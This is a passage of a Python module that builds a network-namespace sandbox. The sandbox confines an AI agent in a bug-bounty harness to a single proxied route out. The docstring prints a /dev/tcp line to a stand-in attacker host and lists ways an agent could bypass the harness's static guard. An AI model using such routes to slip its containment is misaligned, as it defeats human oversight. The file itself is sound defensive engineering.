"""Network-namespace egress control: the harness's one non-advisory boundary.

`guard.check_command` reads shell text and `bbh.http.Session` only binds code
that chooses to call it. Both are advisory, and provably incomplete:

    exec 3<>/dev/tcp/evil.example/80

passes the static guard untouched, a compiled binary opening a socket is
invisible to it, and `git clone`, `npx`, `getent hosts` and any interpreter the
guard does not model all reach the network through code it never parses. The
guard cannot be completed -- there is no finite list of ways a shell can open a
socket -- so containment has to come from the network layer instead.

A phase therefore runs inside a network namespace that has exactly one route
off the machine: one TCP port on the harness proxy, at the host end of a veth
pair, enforced by an nftables ruleset whose output policy is `drop`. There is
no resolver inside the namespace, so a hostname cannot even be turned into an
address locally: every name has to be handed to the proxy in a CONNECT or an
absolute-URI request, which is exactly where the scope check and the recording
happen.

What this contains: every socket the phase can open, whatever opens it. Inside
the namespace the agent runs as the ordinary user with no supplementary groups
and no capabilities, so it cannot add a route, flush the ruleset, move an
interface or build a veth of its own; `unshare -rn` gets it a fresh namespace
containing nothing but loopback.

What it gives up: raw sockets, ICMP, nmap, DNS tooling and anything else that
is not an HTTP request through the proxy stop working. That is the right trade
for web assets and the wrong tool for a network-range engagement.

Root is needed for setup only. Every privileged action is collected into one
script, printed before it runs and executed with a single sudo, so the operator
reads the whole change in one place instead of auditing a scatter of sudo
calls. That script and the state file `wrap_argv` trusts live under
`.state/sandbox/`, outside the engagement directory the runner `--add-dir`s:
something root executes must not be writable by the thing being contained.

Entering an existing namespace needs CAP_SYS_ADMIN, so the launch prefix is
itself privileged (`setpriv` drops straight back to the invoking uid, so the
agent never runs with more than it had). `verify` exercises the real prefix, so
a hunt that could not enter the namespace fails the check rather than quietly
running uncontained.
"""

from __future__ import annotations

import hashlib
import ipaddress
import json
import os
import re
import shlex
import shutil
import subprocess
import sys
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Callable, Container, Iterator, Sequence

from . import paths
from .scope import Scope, ScopeError, host_from_url, is_ip

__all__ = [
    "SandboxError",
    "up",
    "down",
    "verify",
    "status",
    "wrap_argv",
    "environ",
    "plan",
    "SandboxPlan",
    "SandboxCheck",
    "SandboxVerification",
]

STATE_SCHEMA = 1

# Namespaces, interfaces and tables all carry the prefix so an operator reading
# `ip netns list` or `nft list ruleset` can tell what put them there.
NS_PREFIX = "bbh-"
NFT_TABLE = "bbh_egress"

# A kernel without CONFIG_NET_NS does not have this.
NETNS_PROC = Path("/proc/self/ns/net")

# bb proxy start's default port, so the two halves agree without configuration.
DEFAULT_PROXY_PORT = 8080

# /30 point-to-point links, one per engagement, inside a range nothing else is
# likely to use. 10.77.<n>.0/30: .1 host end, .2 namespace end.
LINK_NET = "10.77"
LINK_PREFIX_LEN = 30

# Loopback is reachable inside the namespace (it cannot leave it) and a headless
# browser needs it for its own devtools port, so tools must not proxy it.
NO_PROXY = "localhost,127.0.0.1,::1"

# sudo resets the environment, and the launch prefix goes through sudo, so
# anything the phase needs has to be re-stated as an argument to `env`. This is
# an allowlist rather than a copy of os.environ: it is the one place to decide
# what crosses into the namespace, and a phase that needs something not named
# here should say so rather than inherit it by accident.
PASSTHROUGH_ENV = (
    "PATH", "HOME", "USER", "LOGNAME", "SHELL", "TERM", "TMPDIR",
    "LANG", "LC_ALL", "LC_CTYPE", "TZ",
    "PYTHONPATH",          # the runner puts the repo root here so `bbh` imports
)
PASSTHROUGH_PREFIXES = (
    "BBH_",                # BBH_HOME and BBH_ENGAGEMENT bind the enforcement layers
    "ANTHROPIC_",          # the CLI's credentials
    "CLAUDE_",
    "XDG_",                # where the CLI keeps its config and credentials
)

# Probe budgets. The socket timeout decides how long a dropped packet is waited
# out; the wall-clock one catches a probe that cannot start at all.
PROBE_CONNECT_TIMEOUT_S = 3.0
PROBE_WALL_S = 25.0

# Hosts for the two negative assertions. They must genuinely resolve and answer
# off this machine, or the assertion would pass for the wrong reason: a name
# under `.example` resolves nowhere, so "it failed" would prove nothing.
OUT_OF_SCOPE_PROBE_HOSTS = ("example.com", "www.iana.org")
BARE_IP_PROBE_ADDRS = ("1.1.1.1", "8.8.8.8", "9.9.9.9")
PROBE_PORT = 443

# Every external tool the sandbox needs, and the package that provides it.
TOOLS = {
    "ip": ("iproute2", "iproute"),
    "nft": ("nftables", "nftables"),
    "setpriv": ("util-linux", "util-linux"),
    "env": ("coreutils", "coreutils"),
}

# Same name rule as engagement.py: the name becomes a filename under
# /run/netns and a token in a script root runs, so it is validated, not quoted
# and hoped for.
_NAME_RE = re.compile(r"[a-z0-9][a-z0-9._-]{0,63}")


class SandboxError(RuntimeError):
    """A condition the sandbox cannot be built or trusted through. Message = remedy."""


# ---- names, addresses, tools ----


def _utcnow() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def require_name(engagement: str) -> str:
    name = (engagement or "").strip()
    if not _NAME_RE.fullmatch(name):
        raise SandboxError(
            f"{name!r} is not a usable engagement name for a network namespace (allowed: "
            "lowercase letters, digits, dot, dash, underscore, starting with a letter or "
            "digit). The name becomes a filename under /run/netns and a token in a script "
            "run as root, so it is rejected rather than quoted.\n"
            "  bb list                 # the engagements on this machine"
        )
    return name


def namespace_for(engagement: str) -> str:
    return NS_PREFIX + require_name(engagement)


def _tag(engagement: str) -> str:
    """Short stable id for interface and table names.

    Interface names are capped at 15 characters by the kernel and an engagement
    name can be 64, so the names are hashed rather than truncated: truncation
    would collide between `acme-staging` and `acme-staging-eu` and silently
    point one engagement's veth at the other's namespace.
    """
    return hashlib.sha256(require_name(engagement).encode("utf-8")).hexdigest()[:6]


def interface_names(engagement: str) -> tuple[str, str]:
    """(host end, namespace end) of the veth pair. Both 12 characters."""
    tag = _tag(engagement)
    return f"bbh-{tag}-h", f"bbh-{tag}-g"


def pick_link(engagement: str, taken: Container[str] = ()) -> tuple[str, str]:
    """(host address, namespace address) for this engagement's /30 link.

    Deterministic from the name so two runs of `bb sandbox up` are idempotent,
    but stepped past addresses this host already has, so two engagements
    sandboxed at once do not land on the same /30 and route into each other.
    """
    digest = hashlib.sha256(require_name(engagement).encode("utf-8")).hexdigest()
    start = int(digest[6:8], 16)
    for step in range(256):
        third = (start + step) % 256
        host, guest = f"{LINK_NET}.{third}.1", f"{LINK_NET}.{third}.2"
        if host not in taken and guest not in taken:
            return host, guest
    raise SandboxError(
        f"every /30 in {LINK_NET}.0.0/16 is already configured on this host, so there is "
        "no address pair left for a sandbox link. Remove the stale ones: "
        "ip -o -4 addr show | grep " + LINK_NET
    )


def kernel_problem() -> str | None:
    """Why this kernel cannot contain egress, or None if it can.

    A kernel built without CONFIG_NET_NS has no /proc/self/ns/net, and there is
    nothing to fall back to: say so and let the caller refuse rather than build
    something that looks like a sandbox and contains nothing.
    """
    if sys.platform != "linux":
        return (
            f"network namespaces are a Linux feature and this is {sys.platform!r}, so the "
            "harness cannot contain egress on this machine. Run the hunt on Linux, or "
            "accept the static guard as the only barrier with: bb hunt <engagement> "
            "--unsandboxed"
        )
    if not NETNS_PROC.exists():
        return (
            "this kernel has no network namespace support (/proc/self/ns/net does not "
            "exist, so CONFIG_NET_NS is not enabled). Nothing here can confine egress: "
            "boot a kernel with CONFIG_NET_NS=y, or accept the static guard as the only "
            "barrier with: bb hunt <engagement> --unsandboxed"
        )
    return None


def require_tools() -> dict[str, str]:
    """Absolute paths for every external tool, or a SandboxError naming the package.

    Absolute, because sudo resets PATH and because resolving `ip` through a PATH
    the agent can write to would hand it the privileged step.
    """
    found: dict[str, str] = {}
    missing: list[str] = []
    for tool, (deb, rpm) in TOOLS.items():
        path = shutil.which(tool)
        if path:
            found[tool] = path
        else:
            missing.append(f"  {tool:<8} sudo apt install {deb}   # or: sudo dnf install {rpm}")
    if missing:
        raise SandboxError(
            "the sandbox needs these commands and they are not on PATH, so egress cannot "
            "be contained:\n" + "\n".join(missing) + "\nThen: bb sandbox up <engagement>"
        )
    return found


def host_addresses() -> frozenset[str]:
    """IPv4 addresses already configured on this host. Unprivileged, best effort."""
    ip_bin = shutil.which("ip")
    if not ip_bin:
        return frozenset()
    try:
        done = subprocess.run(
            [ip_bin, "-o", "-4", "addr", "show"],
            capture_output=True,
            text=True,
            timeout=10,
            stdin=subprocess.DEVNULL,
        )
    except (OSError, subprocess.SubprocessError):
        return frozenset()  # a collision then fails loudly in the script instead
    out: set[str] = set()
    for line in done.stdout.splitlines():
        fields = line.split()
        for index, field in enumerate(fields):
            if field == "inet" and index + 1 < len(fields):
                out.add(fields[index + 1].split("/", 1)[0])
    return frozenset(out)


# ---- the mitm CA ----


def find_ca(engagement: str) -> Path:
    """The mitmproxy CA certificate every tool in the namespace must trust."""
    override = (os.environ.get("BBH_PROXY_CA") or "").strip()
    candidates = [Path(override)] if override else []
    candidates += [
        paths.engagement_dir(engagement) / ".state" / "mitmproxy" / "mitmproxy-ca-cert.pem",
        Path.home() / ".mitmproxy" / "mitmproxy-ca-cert.pem",
    ]
    for candidate in candidates:
        if candidate.is_file():
            return candidate.resolve()
    looked = "\n".join(f"  {c}" for c in candidates)
    raise SandboxError(
        "no mitmproxy CA certificate was found, so every HTTPS request inside the "
        "namespace would fail certificate verification and the phase would look like a "
        "dead target. Looked at:\n" + looked + "\n"
        "mitmproxy writes the CA on its first run, so start the proxy once:\n"
        f"  bb proxy start {engagement}\n"
        "If the CA lives somewhere else: export BBH_PROXY_CA=/path/to/mitmproxy-ca-cert.pem"
    )


# ---- the plan ----


@dataclass(frozen=True)
class SandboxPlan:
    """Every name, address and path one engagement's sandbox is built from.

    Written to disk by `up` and read back by `wrap_argv`, `verify` and `down`,
    so the launch prefix cannot drift from what was actually configured.
    """

    engagement: str
    namespace: str
    host_if: str
    ns_if: str
    host_addr: str
    ns_addr: str
    prefix_len: int
    proxy_port: int
    ca_file: str
    host_table: str
    ip_bin: str
    nft_bin: str
    setpriv_bin: str
    env_bin: str

    @property
    def proxy_endpoint(self) -> str:
        return f"http://{self.host_addr}:{self.proxy_port}"

    def as_dict(self) -> dict[str, Any]:
        return {
            "engagement": self.engagement,
            "namespace": self.namespace,
            "host_if": self.host_if,
            "ns_if": self.ns_if,
            "host_addr": self.host_addr,
            "ns_addr": self.ns_addr,
            "prefix_len": self.prefix_len,
            "proxy_port": self.proxy_port,
            "ca_file": self.ca_file,
            "host_table": self.host_table,
            "ip_bin": self.ip_bin,
            "nft_bin": self.nft_bin,
            "setpriv_bin": self.setpriv_bin,
            "env_bin": self.env_bin,
        }

    @classmethod
    def from_dict(cls, data: dict[str, Any]) -> "SandboxPlan":
        try:
            return cls(
                engagement=str(data["engagement"]),
                namespace=str(data["namespace"]),
                host_if=str(data["host_if"]),
                ns_if=str(data["ns_if"]),
                host_addr=str(data["host_addr"]),
                ns_addr=str(data["ns_addr"]),
                prefix_len=int(data["prefix_len"]),
                proxy_port=int(data["proxy_port"]),
                ca_file=str(data["ca_file"]),
                host_table=str(data["host_table"]),
                ip_bin=str(data["ip_bin"]),
                nft_bin=str(data["nft_bin"]),
                setpriv_bin=str(data["setpriv_bin"]),
                env_bin=str(data["env_bin"]),
            )
        except (KeyError, TypeError, ValueError) as exc:
            raise SandboxError(
                f"the recorded sandbox plan is incomplete ({exc}), so the namespace cannot "
                "be entered with the configuration it was built with. Rebuild it: "
                f"bb sandbox down {data.get('engagement', '<engagement>')} && "
                f"bb sandbox up {data.get('engagement', '<engagement>')}"
            ) from exc

    def validate(self) -> "SandboxPlan":
        """Check a plan read from disk against what the name implies.

        Everything here ends up in an argv that runs under sudo, and the state
        file is only as trustworthy as the uid that can write it -- the same
        honest bound as the scope lock. Recomputing the derivable fields makes
        a tampered or stale file fail closed instead of pointing a phase at
        another engagement's namespace or another binary.
        """
        name = require_name(self.engagement)
        expected_host_if, expected_ns_if = interface_names(name)
        problems: list[str] = []
        if self.namespace != NS_PREFIX + name:
            problems.append(
                f"namespace is {self.namespace!r}, not {NS_PREFIX + name!r}"
            )
        if (self.host_if, self.ns_if) != (expected_host_if, expected_ns_if):
            problems.append(
                f"interfaces are {self.host_if!r}/{self.ns_if!r}, not "
                f"{expected_host_if!r}/{expected_ns_if!r}"
            )
        if self.host_table != f"bbh_host_{_tag(name)}":
            problems.append(f"host table is {self.host_table!r}")
        for field, value in (("host_addr", self.host_addr), ("ns_addr", self.ns_addr)):
            try:
                ipaddress.IPv4Address(value)
            except ValueError:
                problems.append(f"{field} {value!r} is not an IPv4 address")
        if not 1 <= self.proxy_port <= 65535:
            problems.append(f"proxy port {self.proxy_port!r} is not a TCP port")
        for field, value in (
            ("ip_bin", self.ip_bin),
            ("nft_bin", self.nft_bin),
            ("setpriv_bin", self.setpriv_bin),
            ("env_bin", self.env_bin),
        ):
            if not value.startswith("/"):
                problems.append(f"{field} {value!r} is not an absolute path")
        if problems:
            raise SandboxError(
                f"the recorded sandbox plan for {name!r} does not match the engagement it "
                "claims, so it is not trusted to launch anything:\n"
                + "".join(f"  - {problem}\n" for problem in problems)
                + f"  bb sandbox down {name} && bb sandbox up {name}"
            )
        return self


def plan(
    engagement: str,
    *,
    proxy_port: int = DEFAULT_PROXY_PORT,
    ca_file: str | Path | None = None,
    tools: dict[str, str] | None = None,
    taken: Container[str] = (),
) -> SandboxPlan:
    """Build the plan for one engagement. Pure: nothing is created or run."""
    name = require_name(engagement)
    resolved = tools if tools is not None else require_tools()
    host_if, ns_if = interface_names(name)
    host_addr, ns_addr = pick_link(name, taken)
    port = int(proxy_port)
    if not 1 <= port <= 65535:
        raise SandboxError(
            f"{proxy_port!r} is not a TCP port, so the one accept rule would not match the "
            "proxy. Use the port bb proxy start listens on (default "
            f"{DEFAULT_PROXY_PORT})."
        )
    return SandboxPlan(
        engagement=name,
        namespace=NS_PREFIX + name,
        host_if=host_if,
        ns_if=ns_if,
        host_addr=host_addr,
        ns_addr=ns_addr,
        prefix_len=LINK_PREFIX_LEN,
        proxy_port=port,
        ca_file=str(ca_file) if ca_file is not None else str(find_ca(name)),
        host_table=f"bbh_host_{_tag(name)}",
        ip_bin=resolved["ip"],
        nft_bin=resolved["nft"],
        setpriv_bin=resolved["setpriv"],
        env_bin=resolved["env"],
    )


def environ(target: str | SandboxPlan) -> dict[str, str]:
    """The environment a process inside the namespace needs to reach anything.

    The proxy is the only route out, and it terminates TLS, so its CA has to be
    trusted by every runtime the agent might reach for. Each of these names is
    read by a different one: there is no single variable that covers Python,
    requests, node and git.
    """
    spec = target if isinstance(target, SandboxPlan) else load_plan(target)
    endpoint = spec.proxy_endpoint
    ca = spec.ca_file
    return {
        "http_proxy": endpoint,
        "https_proxy": endpoint,
        "HTTP_PROXY": endpoint,
        "HTTPS_PROXY": endpoint,
        "ALL_PROXY": endpoint,
        "no_proxy": NO_PROXY,
        "NO_PROXY": NO_PROXY,
        "SSL_CERT_FILE": ca,          # python ssl, openssl
        "REQUESTS_CA_BUNDLE": ca,     # requests, so bbh.http trusts the proxy
        "CURL_CA_BUNDLE": ca,         # curl
        "NODE_EXTRA_CA_CERTS": ca,    # node, npx, playwright
        "GIT_SSL_CAINFO": ca,         # git over https
        # So a script can tell it is contained without probing the network.
        "BBH_SANDBOX": spec.namespace,
    }


def passthrough_env(source: dict[str, str] | None = None) -> dict[str, str]:
    """The allowlisted slice of this environment that must survive sudo."""
    env = os.environ if source is None else source
    kept = {name: env[name] for name in PASSTHROUGH_ENV if env.get(name)}
    for name, value in env.items():
        if value and name.startswith(PASSTHROUGH_PREFIXES):
            kept[name] = value
    return kept


# ---- the ruleset ----


def nft_ruleset(spec: SandboxPlan) -> str:
    """The namespace's egress ruleset: one accept off the machine, reject the rest.

    `policy drop` stays as the backstop, but the chain rejects explicitly before
    reaching it, and that choice is the opposite of the usual firewall default
    for a reason. A silent drop is right when the party being stopped is an
    adversary who should learn nothing. Here it is our own agent, and a dropped
    SYN does not fail -- it hangs for the kernel's full retry schedule, measured
    at 135s on the build machine. The agent then records a *timeout*, which
    reads as "the target is slow" and gets written into the angle ledger as
    ground covered. That is the exact laundering of a tooling failure into a
    false negative that the `blocked` state exists to prevent, and no prompt can
    fix it because the agent is not being lied to by anything it can inspect.

    Rejecting instead turns the same containment into an instant
    ECONNREFUSED -- 0.00s, a real errno, an error the agent can reason about and
    report. Nothing leaves the namespace either way: the reset is generated by
    this namespace's own kernel for a packet that never left it. The counters
    are here so `bb sandbox verify` can say how many times something tried.
    """
    return f"""\
# bbh sandbox egress ruleset for {spec.engagement}.
# Replaced atomically: the first two lines make `delete` succeed whether or not
# the table is already there, so re-running this cannot leave a half-applied
# ruleset behind.
table inet {NFT_TABLE}
delete table inet {NFT_TABLE}
table inet {NFT_TABLE} {{
    chain output {{
        type filter hook output priority filter; policy drop;

        # Namespace-internal only: the kernel routes traffic addressed to this
        # namespace's own addresses out via lo, and nothing on lo can leave the
        # namespace. A headless browser needs it for its own devtools port.
        oifname "lo" accept

        # The one way out: the harness proxy on the host end of the veth pair.
        # It resolves the name, checks it against the armed scope and records
        # the request. Everything else -- any other address, any other port,
        # UDP, DNS, ICMP, a raw socket -- reaches the rejects below.
        ip daddr {spec.host_addr} tcp dport {spec.proxy_port} counter accept

        # Fail fast, not silently: see the docstring. TCP gets a reset so a
        # connect() returns ECONNREFUSED immediately; everything else gets an
        # ICMP unreachable, which is the same story for a UDP socket.
        meta l4proto tcp counter reject with tcp reset
        counter reject
    }}

    chain input {{
        type filter hook input priority filter; policy drop;
        iifname "lo" accept

        # The proxy's replies, matched statelessly: no conntrack dependency, and
        # narrower than `ct state established` -- nothing else may answer.
        # Dropped rather than rejected: nothing local is waiting on these, so a
        # reject would only emit noise at whoever sent them.
        ip saddr {spec.host_addr} tcp sport {spec.proxy_port} accept
    }}
}}
"""


def nft_host_ruleset(spec: SandboxPlan) -> str:
    """Host-side second layer: never forward this veth, whatever the host does.

    The namespace ruleset is the boundary. This exists because a host with
    ip_forward already on (any Docker install) would otherwise route a packet
    off the machine if that ruleset were ever missing. Policy accept, so it
    cannot affect any other traffic on this host, and its own table, so taking
    one engagement's sandbox down leaves another's rules alone.
    """
    return f"""\
table inet {spec.host_table}
delete table inet {spec.host_table}
table inet {spec.host_table} {{
    chain forward {{
        type filter hook forward priority filter; policy accept;
        iifname "{spec.host_if}" drop
        oifname "{spec.host_if}" drop
    }}
}}
"""


# ---- the one privileged script ----


def build_up_script(spec: SandboxPlan) -> str:
    """The whole privileged half of `up`, as one script the operator can read."""
    q = shlex.quote
    return f"""\
#!/bin/sh
# bbh sandbox: bring up the egress-controlled network namespace for
# engagement {spec.engagement!r}.
#
# Generated by bbh/sandbox.py. Every privileged action for this sandbox is in
# this one file, so it can be read in full before it runs; the harness executes
# it with a single sudo and does nothing else as root.
#
#   namespace   {spec.namespace}
#   veth pair   {spec.host_if} (host) <-> {spec.ns_if} (namespace)
#   addresses   {spec.host_addr}/{spec.prefix_len} <-> {spec.ns_addr}/{spec.prefix_len}
#   egress      TCP {spec.host_addr}:{spec.proxy_port} only -- the harness proxy.
#               Everything else is dropped and there is no resolver inside.
#
# Undo everything this does with: bb sandbox down {spec.engagement}
set -eu

IP={q(spec.ip_bin)}
NFT={q(spec.nft_bin)}
NS={q(spec.namespace)}
HOST_IF={q(spec.host_if)}
NS_IF={q(spec.ns_if)}
HOST_ADDR={q(spec.host_addr)}
NS_ADDR={q(spec.ns_addr)}
LEN={spec.prefix_len}

echo "bbh sandbox: namespace $NS"
if [ ! -e "/run/netns/$NS" ] && [ ! -e "/var/run/netns/$NS" ]; then
    "$IP" netns add "$NS"
fi

# No resolver. `ip netns exec` bind-mounts /etc/netns/$NS over /etc, so a
# hostname cannot be turned into an address inside the namespace at all. Every
# name has to be handed to the proxy, which is where the scope check is.
echo "bbh sandbox: no resolver inside the namespace"
mkdir -p "/etc/netns/$NS"
cat > "/etc/netns/$NS/resolv.conf" <<'RESOLV'
# bbh sandbox: deliberately no nameserver. Egress is proxy-only and the proxy
# resolves. A DNS query in here is a finding, not a lookup to fix.
RESOLV
cat > "/etc/netns/$NS/hosts" <<'HOSTS'
127.0.0.1   localhost
::1         localhost
HOSTS
# Several runtimes resolve the machine's own name while starting up. Without
# this they would fail inside the namespace for the same reason a target name
# does, and that failure would look like a broken target rather than this file.
printf '127.0.0.1\\t%s\\n' "$(uname -n)" >> "/etc/netns/$NS/hosts"

# The veth pair, rebuilt from scratch: a half-configured leftover from an
# interrupted run must not be mistaken for a working sandbox.
echo "bbh sandbox: veth $HOST_IF <-> $NS_IF"
if "$IP" link show "$HOST_IF" >/dev/null 2>&1; then
    "$IP" link del "$HOST_IF"
fi
"$IP" link add "$HOST_IF" type veth peer name "$NS_IF"
"$IP" link set "$NS_IF" netns "$NS"
"$IP" addr add "$HOST_ADDR/$LEN" dev "$HOST_IF"
"$IP" link set "$HOST_IF" up
"$IP" -n "$NS" addr add "$NS_ADDR/$LEN" dev "$NS_IF"
"$IP" -n "$NS" link set "$NS_IF" up
"$IP" -n "$NS" link set lo up

# A default route on purpose. Without one, an off-link packet would fail for
# lack of a route and `bb sandbox verify` could not tell an enforcing ruleset
# from a missing one. With it, the drop policy is what stops the packet, which
# is what the verify asserts. Nothing is forwarded or NATed at the other end.
"$IP" -n "$NS" route replace default via "$HOST_ADDR"

echo "bbh sandbox: egress ruleset (policy drop, one accept)"
"$IP" netns exec "$NS" "$NFT" -f - <<'NFT'
{nft_ruleset(spec)}NFT

echo "bbh sandbox: host-side forward block for $HOST_IF"
"$NFT" -f - <<'NFT'
{nft_host_ruleset(spec)}NFT

echo "bbh sandbox: up. Egress from $NS is TCP $HOST_ADDR:{spec.proxy_port} and nothing else."
"""


def build_down_script(spec: SandboxPlan) -> str:
    """The whole privileged half of `down`. Safe to run twice."""
    q = shlex.quote
    return f"""\
#!/bin/sh
# bbh sandbox: tear down the network namespace for engagement
# {spec.engagement!r}. Removes only what bb sandbox up created.
set -eu

IP={q(spec.ip_bin)}
NFT={q(spec.nft_bin)}
NS={q(spec.namespace)}
HOST_IF={q(spec.host_if)}
HOST_TABLE={q(spec.host_table)}

# Deleting the namespace takes its interfaces and its ruleset with it.
if [ -e "/run/netns/$NS" ] || [ -e "/var/run/netns/$NS" ]; then
    "$IP" netns del "$NS"
fi
if "$IP" link show "$HOST_IF" >/dev/null 2>&1; then
    "$IP" link del "$HOST_IF"
fi
if "$NFT" list table inet "$HOST_TABLE" >/dev/null 2>&1; then
    "$NFT" delete table inet "$HOST_TABLE"
fi
rm -rf "/etc/netns/$NS"

echo "bbh sandbox: down. $NS, $HOST_IF and table inet $HOST_TABLE are gone."
"""


# ---- state on disk ----


def sandbox_dir() -> Path:
    """Where the plan and the generated scripts live.

    Under the harness state directory, never under engagements/<e>/: the runner
    hands that directory to the agent, and a script root executes must not be
    writable by the process being contained. Same reasoning as the scope lock.
    """
    directory = paths.STATE_DIR / "sandbox"
    directory.mkdir(parents=True, exist_ok=True)
    return directory


def state_path(engagement: str) -> Path:
    return sandbox_dir() / f"{require_name(engagement)}.json"


def script_path(engagement: str, action: str) -> Path:
    return sandbox_dir() / f"{require_name(engagement)}-{action}.sh"


def env_path(engagement: str) -> Path:
    return sandbox_dir() / f"{require_name(engagement)}-env.sh"


def save_plan(spec: SandboxPlan) -> Path:
    path = state_path(spec.engagement)
    payload = {
        "schema": STATE_SCHEMA,
        "created_at": _utcnow(),
        "created_by_uid": os.getuid(),
        "plan": spec.as_dict(),
    }
    path.write_text(json.dumps(payload, indent=2) + "\n", encoding="utf-8")
    return path


def load_plan(engagement: str) -> SandboxPlan:
    """The recorded plan, or a SandboxError. Nothing guesses a plan it cannot read."""
    name = require_name(engagement)
    path = state_path(name)
    try:
        data = json.loads(path.read_text(encoding="utf-8"))
    except FileNotFoundError as exc:
        raise SandboxError(
            f"no sandbox has been built for engagement {name!r} ({path} does not exist), so "
            "there is no namespace to run inside and nothing confines egress.\n"
            f"  bb sandbox up {name}\n"
            f"  bb sandbox verify {name}"
        ) from exc
    except (OSError, json.JSONDecodeError, ValueError) as exc:
        raise SandboxError(
            f"the sandbox state file {path} is unreadable ({exc}), so the namespace cannot "
            f"be entered with the configuration it was built with.\n"
            f"  bb sandbox down {name} && bb sandbox up {name}"
        ) from exc
    if data.get("schema") != STATE_SCHEMA:
        raise SandboxError(
            f"sandbox state {path} has schema {data.get('schema')!r}; this build writes "
            f"{STATE_SCHEMA}. Rebuild it: bb sandbox down {name} && bb sandbox up {name}"
        )
    return SandboxPlan.from_dict(data.get("plan") or {}).validate()


def netns_file(namespace: str) -> Path | None:
    """The mount the kernel keeps for a named namespace, if it exists."""
    for directory in (Path("/run/netns"), Path("/var/run/netns")):
        candidate = directory / namespace
        if candidate.exists():
            return candidate
    return None


# ---- launching inside the namespace ----


def _sudo_prefix() -> list[str]:
    """How to get CAP_SYS_ADMIN for `ip netns exec`, or nothing if we have it.

    Entering a named namespace is privileged even though the work inside it is
    not, so the prefix escalates and `setpriv` immediately drops back. `-n`:
    an unattended hunt must fail the sandbox check, not block on a password
    prompt nobody will answer.
    """
    if os.geteuid() == 0:
        return []
    sudo = shutil.which("sudo")
    if not sudo:
        raise SandboxError(
            "entering a network namespace needs CAP_SYS_ADMIN and sudo is not installed, so "
            "a phase cannot be launched inside the sandbox. Run the hunt as root (setpriv "
            "drops straight back to this uid), or install sudo: apt install sudo"
        )
    return [sudo, "-n", "--"]


def netns_prefix(spec: SandboxPlan) -> list[str]:
    """`ip netns exec <ns> setpriv --reuid=… --regid=… --clear-groups`.

    uid and gid are this process's own, so the phase runs with exactly the
    privileges the harness has and no supplementary groups. If the harness
    itself was started as root the phase stays root: the sandbox contains the
    network, it does not make running the harness as root safe.
    """
    return [
        spec.ip_bin,
        "netns",
        "exec",
        spec.namespace,
        spec.setpriv_bin,
        f"--reuid={os.getuid()}",
        f"--regid={os.getgid()}",
        "--clear-groups",
    ]


def wrap_argv(engagement: str, argv: Sequence[str]) -> list[str]:
    """Rewrite a command so it runs inside the engagement's namespace.

    Every variable is passed through `env` as an argument rather than
    inherited, because sudo resets the environment: silently losing http_proxy
    would leave the phase with no route out, and losing BBH_HOME would point
    `bb` at the wrong engagement. The sandbox's own values are applied last, so
    an http_proxy or SSL_CERT_FILE already in this environment cannot override
    the containment.
    """
    spec = load_plan(engagement)
    command = [str(a) for a in argv]
    if not command:
        raise SandboxError(
            "wrap_argv was given an empty command, so there is nothing to run inside the "
            "namespace. Pass the full argv, starting with the program: "
            "wrap_argv(engagement, [claude_bin, '-p', prompt, ...])"
        )
    if command[0].startswith("-"):
        raise SandboxError(
            f"wrap_argv was given {command[0]!r} as the program to run. argv[0] must be the "
            "executable (an absolute path), not a flag, or `env` would read it as its own "
            "option instead of passing it on."
        )
    carried = {**passthrough_env(), **environ(spec)}
    assignments = [f"{key}={value}" for key, value in carried.items()]
    return [*_sudo_prefix(), *netns_prefix(spec), spec.env_bin, *assignments, *command]


# ---- probes: the positive test ----

# Run under `python -I`: no site-packages, no cwd on sys.path, PYTHON* ignored,
# so a planted socket.py in an engagement directory cannot answer for the
# kernel. Parameters arrive as argv, never interpolated into the source.

_CONNECT_PROBE = """\
import json, socket, sys
host, port, timeout = sys.argv[1], int(sys.argv[2]), float(sys.argv[3])
try:
    socket.create_connection((host, port), timeout).close()
except OSError as exc:
    print(json.dumps({"connected": False, "error": type(exc).__name__ + ": " + str(exc)}))
else:
    print(json.dumps({"connected": True, "error": None}))
"""

_PROXY_CONNECT_PROBE = """\
import json, socket, sys
proxy, pport, host, port, timeout = sys.argv[1:6]
request = "CONNECT %s:%s HTTP/1.1\\r\\nHost: %s:%s\\r\\n\\r\\n" % (host, port, host, port)
result = {"connected": False, "status": None, "head": "", "error": None}
try:
    sock = socket.create_connection((proxy, int(pport)), float(timeout))
except OSError as exc:
    result["error"] = type(exc).__name__ + ": " + str(exc)
else:
    result["connected"] = True
    try:
        sock.settimeout(float(timeout))
        sock.sendall(request.encode("ascii"))
        head = sock.recv(512).decode("latin-1", "replace")
        result["head"] = head.splitlines()[0] if head.strip() else ""
        parts = result["head"].split(" ")
        if len(parts) > 1 and parts[0].startswith("HTTP/") and parts[1].isdigit():
            result["status"] = int(parts[1])
    except OSError as exc:
        result["error"] = type(exc).__name__ + ": " + str(exc)
    finally:
        sock.close()
print(json.dumps(result))
"""


# The three assertions `verify` makes, in the order it makes them. Two negative
# and one positive: a namespace with no network at all passes both negatives, so
# only the third tells a working sandbox from a dead one.
ASSERTIONS = ("out_of_scope_host_direct", "bare_ip_direct", "in_scope_host_via_proxy")


@dataclass(frozen=True)
class Probe:
    """One assertion about the namespace, as a command plus the expected answer."""

    name: str
    engagement: str
    expected: str
    want_connected: bool
    argv: tuple[str, ...]
    remedy: str
    via_proxy: bool = False


def in_scope_probe_host(scope: Scope) -> str:
    """A concrete in-scope hostname, for the assertion that the proxy path works."""
    for rule in scope.in_scope:
        value = str(rule.get("value") or "")
        kind = str(rule.get("type") or "")
        if kind == "domain":
            candidate = value
        elif kind == "wildcard":
            candidate = value if rule.get("include_apex", True) else f"www.{value}"
        elif kind == "url_prefix":
            candidate = host_from_url(value) or ""
        else:
            continue  # a cidr names addresses, and a bare address is what must fail
        if candidate and scope.decide(candidate).allowed:
            return candidate
    raise SandboxError(
        f"no concrete in-scope hostname could be derived from the scope of "
        f"{scope.engagement!r}, so the sandbox cannot be proved to reach an authorized "
        "target through the proxy. Add a host rule to scope.yaml, for example "
        "`in_scope: [www.target.example]`, then:\n"
        f"  bb scope compile {scope.engagement} && bb arm {scope.engagement} --as <you>"
    )


def out_of_scope_probe_host(scope: Scope) -> str:
    """A host that resolves off this machine and is not in this engagement's scope."""
    for candidate in OUT_OF_SCOPE_PROBE_HOSTS:
        if not scope.decide(candidate).allowed:
            return candidate
    raise SandboxError(
        f"every out-of-scope probe host ({', '.join(OUT_OF_SCOPE_PROBE_HOSTS)}) is inside "
